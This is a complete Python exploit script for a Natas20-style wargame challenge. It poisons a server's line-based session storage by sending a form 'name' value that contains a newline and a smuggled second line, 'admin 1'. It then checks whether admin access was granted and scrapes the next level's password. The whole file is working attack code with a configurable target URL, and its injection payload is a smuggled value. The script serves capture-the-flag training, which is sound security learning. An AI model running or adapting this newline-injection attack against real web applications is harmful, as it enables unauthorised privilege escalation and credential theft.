#!/usr/bin/env python3
import argparse
import re
import sys
import requests


DEFAULT_MATCH = "You are an admin"
DEFAULT_COOKIE = "PHPSESSID"

# Natas20-style session poisoning payload:
# The server writes:  name <value>\n
# If <value> contains a newline, we can inject a second line: admin 1
DEFAULT_NAME_PAYLOAD = "anyone\nadmin 1"


def parse_args():
    p = argparse.ArgumentParser(
        description="Exploit session-file injection via newline poisoning (Natas20-style)."
    )
    p.add_argument("--url", required=True, help="Target URL (e.g. http://host/index.php)")
    p.add_argument("--user", required=True, help="HTTP Basic Auth username")
    p.add_argument("--password", required=True, help="HTTP Basic Auth password")

    p.add_argument("--cookie-name", default=DEFAULT_COOKIE, help=f"Session cookie name (default: {DEFAULT_COOKIE})")
    p.add_argument("--match", default=DEFAULT_MATCH, help=f"Admin success string (default: {DEFAULT_MATCH})")
    p.add_argument(
        "--name-payload",
        default=DEFAULT_NAME_PAYLOAD,
        help=r"Value to send as 'name' (default: 'anyone\nadmin 1')"
    )

    p.add_argument("--timeout", type=float, default=8.0, help="Request timeout seconds (default: 8)")
    p.add_argument("--verbose", action="store_true", help="Print extra debug info")
    return p.parse_args()


def extract_next_password(html: str) -> str | None:
    # Generic enough for Natas pages:
    m = re.search(r"Password:\s*([A-Za-z0-9]+)\s*</pre>", html)
    if m:
        return m.group(1)

    # Fallback pattern like earlier levels:
    m = re.search(r"password for natas\d+\s*is\s*<b>([^<]+)</b>", html, re.IGNORECASE)
    if m:
        return m.group(1)

    return None


def main():
    args = parse_args()

    s = requests.Session()
    s.auth = (args.user, args.password)

    # 1) Establish a fresh session (get PHPSESSID set by server)
    try:
        r0 = s.get(args.url, timeout=args.timeout)
    except requests.RequestException as e:
        print(f"[-] Initial GET failed: {e}")
        sys.exit(1)

    sid = s.cookies.get(args.cookie_name)
    if args.verbose:
        print(f"[*] Initial status: {r0.status_code}")
        print(f"[*] {args.cookie_name} from server: {sid}")

    if not sid:
        print(f"[-] No {args.cookie_name} cookie received. Check URL/cookie name.")
        sys.exit(1)

    # 2) Poison session by sending newline injection in "name"
    # NOTE: requests will send the newline as part of the form value.
    try:
        r1 = s.post(
            args.url,
            data={"name": args.name_payload},
            timeout=args.timeout
        )
    except requests.RequestException as e:
        print(f"[-] POST failed: {e}")
        sys.exit(1)

    if args.verbose:
        print(f"[*] POST status: {r1.status_code}")

    # 3) Refresh (server reads session file -> should now include admin=1)
    try:
        r2 = s.get(args.url, timeout=args.timeout)
    except requests.RequestException as e:
        print(f"[-] Verification GET failed: {e}")
        sys.exit(1)

    if args.match in r2.text:
        print("[+] Admin session achieved via session injection.")
        print(f"    {args.cookie_name} : {sid}")

        pw = extract_next_password(r2.text)
        if pw:
            print(f"    Next password: {pw}")
        else:
            print("[!] Admin detected, but could not extract the next password automatically.")
            if args.verbose:
                print("\n--- RAW RESPONSE ---\n")
                print(r2.text)

        sys.exit(0)

    print("[-] Admin not achieved. Things to check:")
    print("    - Ensure the target uses Natas20-style custom session storage (line-based key/value).")
    print("    - Ensure the injection payload contains a literal newline: --name-payload $'x\\nadmin 1'")
    print("    - Try a different payload prefix (e.g. 'test\\nadmin 1').")
    if args.verbose:
        print("\n--- RESPONSE SNIPPET ---")
        print(r2.text[:500])
    sys.exit(2)


if __name__ == "__main__":
    main()
